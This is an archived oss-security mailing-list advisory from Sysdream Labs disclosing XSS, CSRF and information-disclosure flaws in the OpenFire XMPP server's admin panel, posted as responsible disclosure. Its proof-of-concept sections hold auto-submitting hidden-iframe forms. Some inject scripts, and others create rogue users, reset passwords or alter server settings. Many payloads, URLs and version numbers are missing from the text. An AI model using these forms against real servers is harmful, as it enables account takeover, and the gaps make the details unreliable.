  oss-security - CVE ID Request : OpenFire multiple vulnerabilities            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Tue, 5 Jul From: Sysdream Labs <labs@...dream.com> To: fulldisclosure@...lists.org, oss-security@...ts.openwall.com Subject: CVE ID Request : OpenFire multiple vulnerabilities  # Several vulnerabilities doscovered in OpenFire version  to   ## Product Description  **OpenFire** is an opensource project under GNU GPL licence. It provides a Jabber/XMPP server fully develloped in Java. It's develloped by the **Ignite realtime** community. The actual version of the product is   Official web site : http://igniterealtime.org/  Several vulnerabilities have been discovered between October and February. Reported vulnerabilities are similar to those previously discovered by hyp3rlinx, although they concern different pages.  In brief, the flaws are of the following kinds: CSRF, XSS (reflected and stored), file upload and information disclosure. Most vulnerabilities need an administration access to the web application and may lead to personal information leakage or account take-over.  **Ingnite realtime** fixed some vulnerabilities (the corresponding commit ID are indicated in this document).   ## Several Relected XSS Vulnerabilities identified in Openfire  **Access Vector**: remote  **Security Risk**: low  **Vulnerability**: CWE-79  **CVSS Base Score**: 5.2  [comment]:  ### Vulnerability Description  Several XSS vulnerabilities have been found on several pages of the administration panel. Reflected XSS may lead to session hijacking on admin user.  ### Proof of Concept  #### *domain* and *remotePort* variables from *server2server-settings.jsp*  The following POST values can be sent to trigger the vulnerability:  ``` ```  or  ``` ```  or  ```  ```  You can reproduce the exploitation with the following curl commands:  ``` curl --data --cookie="JSESSIONID=XXX"   curl --data --cookie="JSESSIONID=XXX"   curl --data --cookie="JSESSIONID=XXX"  ```  #### *criteria* variable from *plugins/search/advance-user-search.jsp*  The following GET request exploits the XSS vulnerability:  ``` ```   ## Several stored XSS Vulnerabilities identified in Openfire  **Access Vector**: remote  **Security Risk**: low  **Vulnerability**: CWE-79  **CVSS Base Score**: 5.5  [comment]:  ### Vulnerability Description  Several XSS vulnerabilities have been found on several pages of the administration panel. Stored XSS could lead to session hijacking on admin user.  ### Proof of Concept  #### *mucdesc* variable from *muc-service-edit-form.jsp*  The following POST values can be sent to trigger the vulnerability:  ``` ```  The following code allows the creation of a web frame exploiting the vulnerability:  ``` <iframe style="display:none" name="xss-frame"></iframe> <form id="xss-form" > <input type="text" name="save" value="true" > <input type="text" name="mucname" value="test" > <input type="text" name="mucdesc" value="%22/><script>alert('XSS')</script>" > </form>  <script>document.getElementById("xss-form").submit()</script> ```  or with this curl command:  ``` curl --data --cookie="JSESSIONID=XXX" ```  #### *searchname* variable from *plugins/search/search-props-edit-form.jsp*  The following POST values can be sent to trigger the vulnerability:  ``` ```  The following code allows the creation of a web frame exploiting the vulnerability:  ``` <iframe style="display:none" name="xss-frame"></iframe> <form id="xss-form" method="post" target="xss-frame" > <input type="text" name="searchEnabled" value="true" > <input type="text" name="searchname" value="search%22/><script>alert('XSS')</script>" > <input type="text" name="groupOnly" value="false" > </form>  <script>document.getElementById("xss-form").submit()</script> ```  or with this curl command:  ``` curl --cookie="JSESSIONID=XXX" ```   #### *searchname* variable from *page plugins/search/search-props-edit-form.jsp*  The following POST values can be sent to trigger the vulnerability:  ``` ```  The following code allows the creation of a web frame exploiting the vulnerability:  ``` <iframe style="display:none" name="xss-frame"></iframe> <form id="xss-form" method="post" target="xss-frame" > <input type="text" name="propValue" value="=adminConsole.port" > <input type="text" name="searchname" x="/> <input type="text" name="encrypt" value="false" > <input type="text" name="save" value="Save Property" > </form>  <script>document.getElementById("xss-form").submit()</script> ```  or with this curl command:  ``` curl --data --cookie="JSESSIONID=XXX" ```  #### *serverName* variable from *plugins/search/search-props-edit-form.jsp*  The following POST values can be sent to trigger the vulnerability:  ``` ```  The following code allows the creation of a web frame exploiting the vulnerability:  ``` <iframe style="display:none" name="xss-frame"></iframe> <form id="xss-form" method="post" target="xss-frame" > <input type="text" name="serverName" > <input type="text" name="serverPort" > <input type="text" name="componentPort" > <input type="text" name="port" > <input type="text" name="sslEnabled" value="true" > <input type="text" name="sslPort" > <input type="text" name="embeddedPort" > <input type="text" name="embeddedSecurePort" > <input type="text" name="jmxEnabled" value="false" > <input type="text" name="jmxSecure" value="true" > <input type="text" name="jmxPort" > <input type="text" name="save" value="Save+Properties" > </form>  <script>document.getElementById("xss-form").submit()</script> ```  or with this curl command:  ``` curl --data --cookie="JSESSIONID=XXX" ```  ### Affected versions  * Version >= and <   ## Several Relected XSS Vulnerabilities identified in Openfire and  **Access Vector**: remote  **Security Risk**: low  **Vulnerability**: CWE-79  **CVSS Base Score**: 5.2  [comment]:  ### Vulnerability Description  Several XSS vulnerabilities have been found on several pages of the administration panel. Reflected XSS could lead to session hijacking against an administrator.  Some of these vulnerabilities have already been found by hyp3rlinx, but had not been patched properly.  ### Proof of Concept  #### *groupchatName*, *groupchatJID*, *users* and *groups* variables from *page create-bookmark.jsp* suffer from the vulnerability  The following POST values can be sent to trigger the vulnerability:  ``` ```  The following curl command allows reproducing the attack against the Openfire *plugins/bookmarks/create-bookmark.jsp* page:  ``` curl --data --cookie="JSESSIONID=XXX" ```  #### *search* variable from *group-summary.jsp*  The following GET request exploit the XSS vulnerability:  ``` ```  The following curl command allows reproducing the attack against the Openfire *group-summary.jsp* page.  ``` curl --cookie="JSESSIONID=XXX" ```   #### *maxTotalSize*, *maxFileSize*, *maxDays*, *logTimeout* variables from *audit-policy.jsp*  The following GET request exploit the XSS vulnerability:  ``` ```  The following curl command allows reproducing the attack against the Openfire *audit-policy.jsp* page:  ``` curl --cookie="JSESSIONID=XXX" ```  #### *passPhrase* variables from *import-keystore-certificate.jsp*  The following POST values exploit the XSS vulnerability:  ``` ```  The following curl command allows reproducing the attack against the Openfire *import-keystore-certificate.jsp* page.  ``` curl --cookie="JSESSIONID=XXX" ```  #### *criteria* variable from */plugins/search/advance-user-search.jsp*  The following GET request exploit the XSS vulnerability:  ``` ```  The following curl command allows reproducing the attack against the Openfire *plugins/search/advance-user-search.jsp* admin page.  ``` curl --cookie="JSESSIONID=XXX" ```  ### Affected versions  * Version and  ## Several stored XSS Vulnerabilities identified in Openfire and  Some of these vulnerabilities have already been found by hyp3rlinx, but has not been patched since.  **Access Vector**: remote  **Security Risk**: low  **Vulnerability**: CWE-79  **CVSS Base Score**: 5.5  [comment]:  ### Vulnerability Description  Several XSS vulnerabilities have been found on several pages of the administration panel. Stored XSS could lead to session hijacking on admin user.  ### Proof of Concept  #### *subdomain* variable from *connection-settings-external-components.jsp*  The following curl command allows reproducing the attack against the Openfire *connection-settings-external-components.jsp* page:  ``` curl --data --cookie="JSESSIONID=XXX" ```  Or  ``` curl --data --cookie="JSESSIONID=XXX" ```  #### *mucdesc* variable from *muc-service-edit-form.jsp*  The following curl command allows reproducing the attack against the Openfire *muc-service-edit-form.jsp* page:  ``` curl --data --cookie="JSESSIONID=XXX" ```  #### *groupchatName*, *groupchatJID*, *users* and *groups* variables from page muc-service-edit-form.jsp  The following curl command allows reproducing the attack against the Openfire *muc-service-edit-form.jsp* page:  ``` curl --data --cookie="JSESSIONID=XXX" ```  #### *searchname* variable from *plugins/search/search-props-edit-form.jsp*  The following curl command allows reproducing the attack against the Openfire *plugins/search/advance-user-search.jsp* page:  ``` curl --cookie="JSESSIONID=XXX" ```  The folling code allows exploiting the vulnerability:  ``` <iframe style="display:none" name="xss-frame"></iframe> <form id="xss-form" method="post" target="xss-frame" > <input type="text" name="searchEnabled" value="true" > <input type="text" name="searchname" value="search%22/><script>alert('XSS')</script>" > <input type="text" name="groupOnly" value="false" > </form>  <script>document.getElementById("xss-form").submit()</script> ```  #### *propValue* variable from *server-properties.jsp*  The following curl command allows reproducing the attack against the Openfire *server-properties.jsp* page:  ``` curl --cookie="JSESSIONID=XXX" ```  The folling code allows exploiting the vulnerability:  ``` <iframe style="display:none" name="xss-frame"></iframe> <form id="xss-form" method="post" target="xss-frame" > <input type="text" name="propValue" value="=adminConsole.port" > <input type="text" name="searchname" x="/> <input type="text" name="encrypt" value="false" > <input type="text" name="save" value="Save Property" > </form>  <script>document.getElementById("xss-form").submit()</script> ```   ###Affected versions  * Version and   ## Several CSRF Vulnerabilities identified in Openfire  **Access Vector**: remote  **Security Risk**: low  **Vulnerability**:  **CVSS Base Score**: 5.4  [comment]:  ### Vulnerability Description  Several CSRF vulnerabilities have been found on different pages of the admin panel of the OpenFire web server. Throught this attack an attacker could drive a valid user to execute unwittingly a request on the OpenFire sever.   ### Proof of Concept  #### *connection-settings-external-components.jsp* page is vulerable to a CSRF attack.  The following HTML iframe command allows reproducing the attack against the Openfire *dwr/exec/downloader.installPlugin.dwr* page:  ``` <iframe style="display:none" name="csrf-frame"></iframe> <form id="csrf-form" method="post" target="csrf-frame" >     <input type="text" name="callCount" value="1" >     <input type="text" name="c0-scriptName" value="downloader" >     <input type="text" name="c0-methodName" value="installPlugin" >     <input type="text" name="c0-id" >     <input type="text" name="c0-param0" value="string:http://www.igniterealtime.org/projects/openfire/plugins/broadcast.jar" >     <input type="text" name="c0-param1" >     <input type="text" name="xml" value="true" > </form>  <script>document.getElementById("csrf-form").submit()</script> ```   #### *client-connections-settings.jsp* is vulerable to a CSRF attack.  The following HTML iframe command allows reproducing the attack against the Openfire *client-connections-settings.jsp* page:  ``` <iframe style="display:none" name="csrf-frame"></iframe> <form id="csrf-form" method="post" target="csrf-frame" >     <input type="text" name="port" >     <input type="text" name="sslEnabled" value="false" >     <input type="text" name="sslPort" >     <input type="text" name="idleDisco" value="true" >     <input type="text" name="clientIdle" >     <input type="text" name="pingIdleClients" value="true" >     <input type="text" name="update" value="Save Settings" > </form>  <script>document.getElementById("csrf-form").submit()</script> ```  #### *manage-updates.jsp* is vulerable to a CSRF attack.  The following HTML iframe command allows reproducing the attack against the *Openfire manage-updates.jsp* page:  ``` <iframe style="display:none" name="csrf-frame"></iframe> <form id="csrf-form" method="post" target="csrf-frame" >     <input type="text" name="serviceEnabled" value="false" >     <input type="text" name="notificationsEnabled" value="false" >     <input type="text" name="proxyEnabled" value="true" >     <input type="text" name="proxyHost" >     <input type="text" name="proxyPort" >     <input type="text" name="update" value="Save Settings" > </form>  <script>document.getElementById("csrf-form").submit()</script> ```  #### *plugin-admin.jsp* is vulerable to a CSRF attack.  The following HTML iframe command allows reproducing the attack against the Openfire *plugin-admin.jsp* page.  ``` <iframe style="display:none" name="csrf-frame"></iframe> <form id="csrf-form" method="get" target="csrf-frame" >     <input type="text" name="deleteplugin" value="broadcast" > </form>   <script>document.getElementById("csrf-form").submit()</script> ```  The following HTML iframe command allows reproducing the attack against the Openfire *reg-settings.jsp* page:  ``` <iframe style="display:none" name="csrf-frame"></iframe> <form id="csrf-form" method="get" target="csrf-frame" >     <input type="text" name="inbandEnabled" value="false" >     <input type="text" name="canChangePassword" value="false" >     <input type="text" name="anonLogin" value="fasle" >     <input type="text" name="allowedIPs" >     <input type="text" name="allowedAnonymIPs" >     <input type="text" name="save" value="Save Settings" > </form>   <script>document.getElementById("csrf-form").submit()</script> ```  #### *server-properties.jsp* is vulerable to a CSRF attack.  The following HTML iframe command allows reproducing the attack against the Openfire *server-properties.jsp* admin page.  ``` <iframe style="display:none" name="csrf-frame"></iframe> <form id="csrf-form" method="post" target="csrf-frame" >     <input type="text" name="propName" value="test" >     <input type="text" name="propValue" value="test" >     <input type="text" name="encrypt" value=""false >     <input type="text" name="save" value="Save Property" > </form>  <script>document.getElementById("csrf-form").submit()</script> ```  #### *system-email.jsp* is vulerable to a CSRF attack.  The following HTML iframe command allows reproducing the attack against the Openfire *system-email.jsp* admin page.  ``` <iframe style="display:none" name="csrf-frame"></iframe> <form id="csrf-form" method="post" target="csrf-frame" >     <input type="text" name="host" value="mail.google.com" >     <input type="text" name="port" value="25" >     <input type="text" name="debug" value="false" >     <input type="text" name="server_username" value="toto" >     <input type="text" name="server_password" value="toto" >     <input type="text" name="save" value="Save Changes" > </form> ```  ### Affected versions  * Version >= and <   ## Several CSRF Vulnerabilities identified in Openfire  **Access Vector**: remote  **Security Risk**: low  **Vulnerability**:  **CVSS Base Score**: 5.4  [comment]:  ### Vulnerability Description  Several CSRF vulnerabilities have been found on different pages of the admin panel of the OpenFire web server. Through this attack, an attacker could drive a valid user to execute unwittingly a request to the OpenFire sever.  These vulnerabilities have already been found by hyp3rlinx, but had not been patched yet.  ### Proof of Concept  #### *connection-settings-external-components.jsp* is vulerable to a CSRF attack.  The following HTML iframe command allows reproducing the attack against the Openfire *dwr/exec/downloader.installPlugin.dwr* page:  ``` <iframe style="display:none" name="csrf-frame"></iframe> <form id="csrf-form" method="get" target="csrf-frame" >     <input type="text" name="name" value="Evil" >     <input type="text" name="email" value="evil@...l.f" >     <input type="text" name="password" value="evil" >     <input type="text" name="passwordConfirm" value="evil" >     <input type="text" name="create" value="Create+User" > </form>  <script>document.getElementById("csrf-form").submit()</script> ```  #### *client-connections-settings.jsp* is vulerable to a CSRF attack.  The following HTML iframe command allows reproducing the attack against the Openfire *client-connections-settings.jsp* page.  ``` <iframe style="display:none" name="csrf-frame"></iframe> <form id="csrf-form" method="post" target="csrf-frame" >     <input type="text" name="username" value="victim" >     <input type="text" name="password" value="evil" >     <input type="text" name="passwordConfirm" value="evil" >     <input type="text" name="update" value="Update+Password" > </form>  <script>document.getElementById("csrf-form").submit()</script> ```  ### Affected versions  * Version and   ## Sensitive information disclosure in OpenFire Server  **Access Vector**: remote  **Security Risk**: low  **Vulnerability**:  **CVSS Base Score**: 5.5  [comment]:  ### Vulnerability Description  A sensitive information disclosure vulnerabilty is present in the page *system-email.jsp*. It allow's an authenticated user to retreive the md5 hash the password of an email account.  ### Vulnerable code  The following HTML code is reveived by an authenticated user on the page system-email.jsp. The md5 hash of the password is sent to the user.  ``` <tr>     <td nowrap>         Server Username (Optional):     </td>     <td nowrap>         <input type="text" name="server_username" value="myusername" size="40"     </td> </tr> <tr>     <td nowrap>         Server Password (Optional):     </td>     <td nowrap>         <input type="password" name="server_password" size="40"     </td> </tr> ```   ### Affected versions  * Version and  ### Fixes  *  ### Solution  Update to version  ### Timeline (dd/mm/yyyy)  * : Initial discovery * : Contact with vendor team * : vendor fixes vulnerabilities * : vendor releases version which includes the fixes  ## Credits  * Florian Nivette <f.nivette@...dream.com>     --  SYSDREAM Labs <labs@...dream.com>  GPG : C43E 2A2E 8EB4 8CD9 D5B2  * Website: https://sysdream.com/ * Twitter: @sysdream   Download attachment "signature.asc" of type "application/pgp-signature" bytes)  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      